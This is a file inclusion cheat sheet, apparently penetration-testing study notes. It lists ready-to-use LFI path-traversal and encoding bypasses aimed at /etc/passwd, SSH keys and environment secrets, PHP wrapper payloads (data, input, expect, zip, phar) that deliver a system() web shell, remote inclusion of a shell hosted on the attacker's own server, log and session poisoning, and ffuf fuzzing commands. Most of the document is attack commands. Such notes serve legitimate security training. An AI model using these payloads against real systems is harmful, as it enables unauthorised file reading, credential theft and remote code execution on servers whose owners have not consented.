# FILE INCLUSION CHEAT SHEET

## Note

```
	LFI
	|
	|__ Info disclosure
	|
	├── PHP Wrappers (if supported)
	│   ├── file://      → Default. Reads local files. (e.g., file:///etc/passwd)
	│   ├── php://filter → Used to read source code via base64 (e.g., php://filter/read=convert.base64-encode/resource=index.php)
	│   ├── data://      → Embeds inline data (e.g., include("data://text/plain;base64,..."))
	│   ├── expect://    → Executes commands (RCE) if enabled (e.g., expect://id)
	│   ├── input://     → Reads raw POST input (in old PHP versions)
	│   ├── zip://       → Reads from a ZIP archive (e.g., zip://archive.zip#file.txt)
	│   ├── phar://      → Used to trigger unserialize bugs (RCE via Phar deserialization)
	│   └── http:// / https:// → Remote file inclusion (if allow_url_include=On)
	|
	├── Log File Poisoning
	│   │   ├── Inject PHP via User-Agent
	│   │   └── Include access.log or error.log
	│   │
	│   ├── Session Poisoning
	│   │   ├── Inject PHP code via session-controlled field
	│   │   └── Include /tmp/sess_<PHPSESSID>
```

---

## Note

### The Standard LFI Checklist
Hit these in order whenever you have file read:
```
/proc/self/environ    → env vars: secrets, SECRET_KEY, HOME, tokens
/proc/self/cmdline    → how the process was started (reveals filenames)
/proc/self/cwd        → symlink to current working directory
/etc/passwd           → system users
/home/USER/.ssh/id_rsa → SSH private keys
```

### `/proc/self/cwd` — The Path Bypass Trick
`/proc/self/cwd` is a kernel-maintained symlink to **wherever the current process is running from**. You don't need to know the full path:
```
../../../proc/self/cwd/app.py  →  resolves to  /home/web/web/app.py
```
This is more reliable than guessing paths like `/var/www/html/` or `/opt/app/`.

### `/proc/self/environ` Output is Null-Byte Delimited
Environment variables are separated by `\x00`, so they look like hex garbage in a browser. Clean it up:
```bash
curl ... | tr '\0' '\n'
# or
curl ... | strings
```

### Reading Source Code via LFI
Once you find the working directory, read all imported modules:
```python
# app.py imports tell you every file to grab
from config import *       → read config.py
from utils import ...      → read utils.py
from api_admin import ...  → read api_admin.py
```
Use LFI to download each one and audit for vulnerabilities.

### LFI Applies to Any Linux Web Stack
`/proc/self/` is a **Linux kernel feature**, not framework-specific. Works on:
- Flask / Django / FastAPI
- PHP on Apache/Nginx
- Node.js
- Java/Tomcat

What changes per stack: where secrets live, where source code is, which users exist.

### Filtering Real Users from `/etc/passwd`
Look for UID >= 1000 and a real shell:
```bash
grep -E "/bin/bash|/bin/sh" /etc/passwd
# or
awk -F: '$3 >= 1000 && $7 ~ /bash|sh/ {print $1, $3, $6, $7}' /etc/passwd
```
Anything with `/usr/sbin/nologin` or `/bin/false` can't get a shell — skip it.

---

## Table of Contents

- [Local File Inclusion](#local-file-inclusion)
  - [LFI Bypasses](#lfi-bypasses)
- [Remote Code Execution](#remote-code-execution)
  - [PHP Wrappers](#php-wrappers)
  - [RFI (Remote File Inclusion)](#rfi-remote-file-inclusion)
  - [LFI + Upload](#lfi--upload)
  - [Log Poisoning](#log-poisoning)
- [Misc](#misc)
- [LFI Wordlists](#lfi-wordlists)
- [File Inclusion Functions](#file-inclusion-functions)



## Local File Inclusion

| Command | Description |
|---------|-------------|
| `/index.php?language=/etc/passwd` | Basic LFI |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |

### LFI Bypasses

| Command | Description |
|---------|-------------|
| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
| `/index.php?language=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd` | Double encoded |
| `/index.php?language=./languages/../../../../etc/passwd` | The web application we have been dealing with may only accept paths that are under the `./languages` directory |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |

## Remote Code Execution

### PHP Wrappers

| Name | Description | Note |
|-|-|-|
| **Filter Wrapper** | Has several parameters, but we mainly use this for **reading resources**.<br>**Example:** `php://filter/read=convert.base64-encode/resource=config` | `config` is file name |
| **Data Wrapper** | Can be used to include external data - which can be leverage for RCE, including PHP code.<br>Only available to use if the (**`allow_url_include`**) setting is enabled in the PHP configurations.<br>**Example:** `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | Check if `allow_url_include = On` in config (use **Filter wrapper** or something else to read config file).<br>We can also pass it **base64** encoded strings with **text/plain;base64**, and it has the ability to decode them and execute the PHP code. |
| **Input Wrapper** | Similar to the `data` wrapper, can be used to include external input and execute PHP code.<br>The difference is we pass our input to the `input` wrapper as a **POST** request's data.<br>**Example**: `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" l grep uid` | The vulnerable parameter must accept POST requests for this attack to work.<br>Also depends on the `allow_url_include` setting |
| **Expect Wrapper** | Allows us to directly run commands through URL streams.<br>Designed to execute commands.<br>**Example:** `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | Is an external wrapper, so it needs to be **manually installed and enabled** on the back-end server.<br>Check as `allow_url_include` but grep for `expect`.<br>Look like this: `extension=expect` |
| **ZIP Wrapper** | Can be utilized to execute PHP code.<br>Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded).<br>**Example:** `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id` | Not enabled by default and may not always work.<br>Need to create and upload a shell before can use. |
| **Phar Wrapper** | Similar to `zip` wrapper, but must use script to convert shell to `.phar` file to use.<br>**Example:** `http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | Both `zip` and `phar` wrapper are not reliable.<br>Check 9.2 for more specific usage of both.|



### Wrapper commands

| Command | Description |
|---------|-------------|
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |

### RFI (Remote File Inclusion)

| Command | Description |
|---------|-------------|
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell |

### LFI + Upload

| Command | Description |
|---------|-------------|
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg' |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |

### Log Poisoning

| Command | Description |
|---------|-------------|
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session parameters |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |

## Misc

| Command | Description |
|---------|-------------|
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |

## LFI Wordlists
- LFI Wordlists (SecLists/Fuzzing/LFI/)
- LFI-Jhaddix.txt (SecLists/Fuzzing/LFI/)
- Webroot path wordlist for Linux (SecLists/Discovery/Web-Content)
- Webroot path wordlist for Windows (SecLists/Discovery/Web-Content)
- Server configurations wordlist for Linux (https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
- Server configurations wordlist for Windows (https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)

- Top 25 parameters:
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```


## File Inclusion Functions

### PHP

| Function | Read Content | Execute | Remote URL |
|----------|--------------|---------|------------|
| include()/include_once() | Yes | Yes | Yes |
| require()/require_once() | Yes | Yes | No |
| file_get_contents() | Yes | No | Yes |
| fopen()/file() | Yes | No | No |

### NodeJS

| Function | Read Content | Execute | Remote URL |
|----------|--------------|---------|------------|
| fs.readFile() | Yes | No | No |
| fs.sendFile() | Yes | No | No |
| res.render() | Yes | Yes | No |

### Java

| Function | Read Content | Execute | Remote URL |
|----------|--------------|---------|------------|
| include | Yes | No | No |
| import | Yes | Yes | Yes |

### .NET

| Function | Read Content | Execute | Remote URL |
|----------|--------------|---------|------------|
| @Html.Partial() | Yes | No | No |
| @Html.RemotePartial() | Yes | No | Yes |
| Response.WriteFile() | Yes | No | No |
| include | Yes | Yes | Yes |
